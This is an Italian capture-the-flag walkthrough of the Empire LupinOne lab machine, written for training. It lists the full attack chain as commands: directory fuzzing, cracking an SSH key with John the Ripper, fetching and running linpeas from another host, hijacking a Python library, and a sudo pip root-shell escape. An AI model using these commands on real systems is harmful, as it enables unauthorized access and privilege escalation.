# 🛡️ CyberCerberus: Seconda CTF Bonus - BuildWeek2

Benvenuto nel walkthrough professionale del CTF **Empire LupinOne**! Questo documento rappresenta il lavoro collaborativo del **TeamCyberCerberus**, che ha unito le proprie competenze per completare con successo il challenge. 💻

## [🏠 HOME](./README.MD)

---

## 🔍 **Pentesting Methodology**

### 1️⃣ **Network Scanning**
- **Identificazione dell'indirizzo IP target**:
  ```bash
  sudo nmap -p- -Pn -O -sV -sC -sS 192.168.1.7
  ```
- **Risultati**:
  - **Porta 80 (HTTP)**: Server web attivo. 

---

### 2️⃣ **Enumeration**

#### 🕵️‍♂️ Analisi del sito web
- Accesso alla porta 80 per esplorare il contenuto.
- Individuazione di `/robots.txt` che suggerisce una directory nascosta: `/~myfiles`.

#### ⚡ Fuzzing con FFUF
- Ricerca di directory nascoste:
  ```bash
  ffuf -u http://192.168.1.7/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -c
  ```
- Directory scoperta: `/~secret`.

---

### 3️⃣ **Exploitation**

#### 🔐 Scoperta e decifrazione di chiavi SSH
- File SSH privato individuato in `/~secret`.
- Ricerca di file aggiuntivi con FFUF:
  ```bash
  ffuf -u http://192.168.1.7/~secret/.FUZZ -e .py,.java,.php,.dart,.rar,.zip,.txt,.html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -c -ic -fc 403
  ```
- File trovato: `victim_id_rsa`.

#### 🛠️ Conversione e brute force della chiave SSH
- Conversione della chiave per John the Ripper:
  ```bash
  ssh2john victim_id_rsa > hash_password
  ```
- Brute force con John the Ripper:
  ```bash
  john --wordlist=/usr/share/wordlists/fasttrack.txt hash_password
  ```
  - **Password trovata**: `P@55w0rd!`

#### 🚀 Accesso SSH
- Connessione alla macchina target:
  ```bash
  ssh -i victim_id_rsa icex64@192.168.1.7
  ```
- **Flag utente**: `user.txt` 🎉.

---

### 4️⃣ **Privilege Escalation**

#### 🧑‍💻 Verifica dei privilegi di `sudo`
- Analisi dei permessi:
  ```bash
  sudo -l
  ```
  - Individuato file vulnerabile: `/home/arsene/heist.py`.

#### 🔍 Analisi con linpeas
- Esecuzione del tool:
  ```bash
  wget 192.168.1.8/linpeas.sh
  chmod +x linpeas.sh
  ./linpeas.sh
  ```
- Individuato file Python `webbrowser.py`:
  ```bash
  nano /usr/lib/python3.9/webbrowser.py
  ```
  - **Modifica**: aggiunta di `os.system("/bin/bash")`.

#### 🐍 Escalation con script Python
- Escalation dei privilegi:
  ```bash
  sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
  ```
  - Accesso come utente `arsene`.

#### 📦 Escalation finale con pip
- Esecuzione exploit di pip:
  ```bash
  TF=$(mktemp -d)
  echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
  sudo pip install $TF
  ```
  - **Accesso root** 🎉.

---

## 🏆 **Root Flag**

- Lettura del flag root:
  ```bash
  cat /root/root.txt
  ```

---

## 🎯 **Conclusione**

Il CTF **Empire LupinOne** è stato completato con successo grazie alla sinergia del **TeamCyberCerberus**! 🔓 Questo walkthrough evidenzia l'importanza di strumenti come **nmap**, **FFUF**, **linpeas**, e tecniche di privilege escalation come **pip** e Python library hijacking. 💻

Grazie per aver seguito questa guida e per il supporto al nostro team! 💪

## [🏠 HOME](./README.MD)
